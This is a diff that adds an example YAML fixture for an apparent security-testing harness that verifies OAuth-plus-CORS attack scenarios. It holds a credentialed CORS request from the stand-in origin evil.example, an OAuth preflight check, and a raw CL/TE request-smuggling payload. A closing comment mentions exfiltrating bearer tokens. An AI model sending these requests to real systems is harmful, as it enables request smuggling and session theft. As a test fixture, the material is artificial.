@@ -1,0 +1,94 @@
+# Example known_attacks.yaml in fallback_per_protocol mode
+#
+# This file demonstrates the fallback oracle mode for novel-composition
+# scenarios like Gap #1 (OAuth 2 bearer + CORS preflight). The composition
+# itself has NO published academic CVE; we fall back to per-protocol CVEs
+# as a weak oracle so the Attack Verifier can still validate the stack.
+
+scenario_id: SCN-OAUTH-CORS-PREFLIGHT
+bug_layer: L4
+source: "no published composition attack - novel research direction"
+oracle_mode: fallback_per_protocol
+
+# Empty: no composition-level CVE / paper exists for this exact triple.
+attacks: []
+
+# Required when oracle_mode=fallback_per_protocol.
+# At least 1 attack per protocol in the scenario.
+fallback_per_protocol_attacks:
+
+  cors:
+    - id: cors-A1-origin-reflection-credentialed
+      reference: "CVE-2018-20744"
+      reference_url: "https://nvd.nist.gov/vuln/detail/CVE-2018-20744"
+      affected: "Go rs/cors <=1.3.0 deployed behind nginx"
+      trigger:
+        protocol: http/1.1
+        method: GET
+        path: /api/whoami
+        headers:
+          Origin: "https://evil.example"
+          Cookie: "session=victim-cookie"
+      expected_wire_effect:
+        response_headers_must_have:
+          Access-Control-Allow-Origin: "https://evil.example"   # reflected
+          Access-Control-Allow-Credentials: "true"
+        # Proves: any-origin can issue credentialed cross-origin requests
+      evidence:
+        - "Response Access-Control-Allow-Origin echoes attacker Origin"
+
+  oauth_2:
+    - id: oauth-A1-preflight-401-leak
+      reference: "auth0/node-oauth2-jwt-bearer#44"
+      reference_url: "https://github.com/auth0/node-oauth2-jwt-bearer/issues/44"
+      affected: "express-oauth2-jwt-bearer pre-fix; affects most OAuth2 RS middlewares"
+      trigger:
+        protocol: http/1.1
+        method: OPTIONS                       # preflight: no Authorization header
+        path: /api/protected
+        headers:
+          Origin: "https://app.example"
+          Access-Control-Request-Method: GET
+          Access-Control-Request-Headers: Authorization
+      expected_wire_effect:
+        response_status: 401                   # middleware demanded a bearer on OPTIONS
+        # Spec correctness: a CORS preflight should not require credentials.
+      evidence:
+        - "OAuth middleware returned 401 to OPTIONS request"
+        - "Browsers will then refuse to fire the real GET"
+
+  http_1_1:
+    - id: http-A1-request-smuggling-cl-te
+      reference: "Kettle Request Smuggling 2019 + many CVEs"
+      affected: "front-end vs back-end with mismatched CL/TE handling"
+      trigger:
+        protocol: http/1.1
+        raw_request: |
+          POST / HTTP/1.1
+          Host: target
+          Content-Length: 13
+          Transfer-Encoding: chunked
+
+          0
+
+          SMUGGLED
+      expected_wire_effect:
+        backend_receives_second_request: true
+      evidence:
+        - "Backend log shows two requests where front-end sent one"
+
+verifier_pass_threshold:
+  # Environment is ready when at least 1 fallback attack per protocol reproduces.
+  require_per_protocol_min: 1
+  fallback_only: true
+
+# Note for the Fuzzer Agent (downstream evaluation phase):
+#   These fallback attacks prove the stack is wired correctly. The actual
+#   research question - "does the COMPOSITION of OAuth bearer + CORS preflight
+#   create a new bug class?" - is what the Fuzzer is evaluated on. Specifically:
+#     - Can the OAuth middleware's preflight handling be tricked into
+#       accepting a bearer-less OPTIONS as a credentialed request?
+#     - Can an attacker use CORS to exfiltrate the bearer token via
+#       error-message reflection on misconfigured RS endpoints?
+#     - Are there cache-key / cache-poisoning interactions when the bearer
+#       endpoint is fronted by a shared CDN?
